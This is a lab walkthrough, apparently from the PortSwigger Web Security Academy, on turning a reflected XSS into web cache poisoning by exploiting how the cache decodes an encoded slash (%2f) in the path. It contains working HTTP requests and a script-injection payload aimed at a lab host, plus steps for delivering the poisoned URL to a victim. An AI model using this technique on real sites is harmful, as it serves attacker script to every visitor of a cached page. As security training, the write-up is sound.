# Web Cache Poisoning via URL Normalization



## Lab Summary



This lab demonstrates how a **Reflected XSS** vulnerability can become exploitable through **Web Cache Poisoning caused 
by URL normalization**.



The XSS is not directly exploitable because the browser URL-encodes the malicious URL.



However, the cache decodes and normalizes the URL path before generating the cache key.



This creates a discrepancy between how the browser, backend, and cache interpret the same URL.


---



## Goal



Exploit the URL normalization behavior to poison the cache with a reflected XSS payload and deliver a malicious URL to 

the victim.



The final goal is to execute:



```javascript

alert(1)

```



in the victim's browser.



---



# 🧠 Core Concept



The vulnerability relies on the cache decoding the URL path before generating its cache key.



We use:



```text

%2f

```



which represents:



```text

/

```



The backend treats `%2f` as part of the requested path and reflects it in a `404` response.



The cache, however, URL-decodes `%2f` before creating the cache key.



Therefore, the cache can treat the malicious request as equivalent to a request for the homepage.



---



# 🔍 Step 1 — Identify a Cache Oracle



First, request the homepage:



```http

GET / HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

```



Look for caching-related headers:



```http

Cache-Control: max-age=10

X-Cache: miss

Age: 0


```



Resending the same request shortly afterwards produces:



```http

X-Cache: hit

Age: 3

```



This confirms that the homepage is cached.


### Useful Cache Headers




* `X-Cache: hit` → response was served from cache.

* `X-Cache: miss` → request reached the backend.


* `Age` → age of the cached response.

* `Cache-Control: max-age=10` → cached response remains valid for 10 seconds.


---


# 🔎 Step 2 — Find the Reflected XSS



Request a non-existent path:



```http

GET /random HTTP/2

```



The application reflects the requested path:



```html

<p>Not Found: /random</p>

```



This indicates that the URL path is reflected in the response.



Test an XSS payload such as:



```text

/random</p><script>alert(1)</script><p>foo

```



The payload is reflected in the response.



However, loading the URL directly in the browser does not execute the XSS because the browser URL-encodes the payload.





---



# 🔥 Step 3 — Exploit URL Normalization



Use an encoded slash:



```text

%2f

```



instead of:



```text

/

```



Send:




```http

GET %2f<script>alert(1)</script> HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

```



The backend responds with:




```http

HTTP/2 404 Not Found

Cache-Control: max-age=10

X-Cache: miss

Age: 0

```



and reflects the payload:



```html


<p>Not Found: %2f<script>alert(1)</script></p>



```



This confirms that the reflected XSS payload is present.


---



# 🧩 Step 4 — Understand the Cache Key Discrepancy



The important difference is how the URL is interpreted.



### Backend




The backend processes:



```text

%2f

```




as part of the requested path and returns a `404` response.





### Cache



The cache URL-decodes the path before generating the cache key:




```text

%2f

 ↓

/


```



Therefore:



```text

GET %2f<script>alert(1)</script>

```



can be normalized by the cache into a key equivalent to:



```text

/<script>alert(1)</script>

```




This normalization behavior allows the malicious response to interfere with the cache entry associated with the homepage.



---



# ☠️ Step 5 — Poison the Cache



Send the malicious request through Burp Repeater:



```http

GET %2f<script>alert(1)</script> HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

```



After successful poisoning, the malicious response is stored in the cache.


A cache hit should return the poisoned response:



```http

X-Cache: hit

```


while still containing the XSS payload.


---



# 💥 Step 6 — Verify the Poisoned Homepage




Immediately visit:



```text


https://YOUR-LAB-ID.web-security-academy.net/

```



and refresh the page.



Because the cache normalized the malicious URL into the same cache key used by the homepage, the homepage receives the 

poisoned response.


The result is:



```text

alert(1)


```



executing in the browser.



---




# 🎯 Step 7 — Deliver the Malicious URL



The cache lifetime in this lab is only:



```http

Cache-Control: max-age=10

```





so the cache must be poisoned again immediately before delivering the link.



Then use:



**Deliver link to victim**



and submit the malicious URL.



When the victim visits it:



```text

Malicious URL

      ↓

URL normalization

      ↓

Cache key collision

      ↓


Poisoned cached response

      ↓

Reflected XSS

      ↓

alert(1)

```



✅ **Lab Solved**



---


# 🧠 Attack Chain



```text

Reflected XSS

      ↓

Browser URL encoding

      ↓

Use encoded slash (%2f)

      ↓
Cache URL normalization

      ↓

Cache key collision

      ↓

Web Cache Poisoning

      ↓

Victim visits malicious URL

      ↓

alert(1)


```



---




# 🔑 Key Takeaways



### 1. Reflected XSS may not be directly exploitable



An XSS payload can be reflected by the server but fail to execute because of browser URL encoding.



### 2. URL parsing inconsistencies matter



Different components may normalize URLs differently:



```text

Browser ≠ Cache ≠ Backend

```



This can create security vulnerabilities.



### 3. Cache keys are critical



If a cache normalizes an encoded URL before generating its cache key, different URLs can unexpectedly map to the same 
cache entry.




### 4. Cache poisoning can amplify an XSS





A reflected XSS normally requires the victim to visit a specially crafted URL.


With cache poisoning, the malicious response can become associated with a cacheable resource such as the homepage.




### 5. Use cache busters during real testing



When testing cache behavior on real applications, cache busters should be used where appropriate to avoid accidentally poisoning responses for other users.



---



## Final Result



Successfully exploited the combination of:



```text

Reflected XSS

+

URL normalization discrepancy

+

Web Cache Poisoning

```



to execute:



```javascript

alert(1)

```



in the victim's browser.




✅ **Lab Solved**
